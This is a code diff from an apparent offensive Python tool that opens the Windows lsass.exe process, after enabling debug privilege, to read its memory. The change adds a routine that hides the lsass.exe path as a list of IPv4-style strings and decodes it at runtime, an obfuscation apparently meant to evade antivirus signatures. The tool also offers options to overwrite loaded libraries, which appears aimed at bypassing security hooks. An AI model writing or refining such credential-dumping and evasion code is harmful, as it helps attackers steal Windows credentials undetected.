@@ -319,6 +319,14 @@ def enable_debug_privilege():
             NtClose(token_handle)
 
 
+def decodeIPv4(byte_strings):
+    byte_array = bytearray()
+    for byte_string in byte_strings:
+        bytes = map(int, byte_string.split('.'))
+        byte_array.extend(bytes)
+    return byte_array.decode('utf-8').rstrip('\0')
+
+
 def get_args():
     parser = argparse.ArgumentParser()
     parser.add_argument('-o', '--option', required=False, action='store', help='Option for library overwrite: \"disk\", \"knowndlls\" or \"debugproc\"')
@@ -349,8 +357,12 @@ def main():
     # Get SeDebugPrivilege 
     enable_debug_privilege()
 
+    # Decode process name to "C:\\WINDOWS\\system32\\lsass.exe"
+    process_name_ipv4_encoded  = ["67.58.92.87", "73.78.68.79", "87.83.92.115", "121.115.116.101", "109.51.50.92", "108.115.97.115", "115.46.101.120", "101.0.0.0"]
+    process_name = decodeIPv4(process_name_ipv4_encoded)
+    
     # Get process handle
-    process_handle = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe")
+    process_handle = GetProcessByName(process_name)
     print("[+] Process handle: \t" + str(process_handle.value))
     
     # Loop memory regions
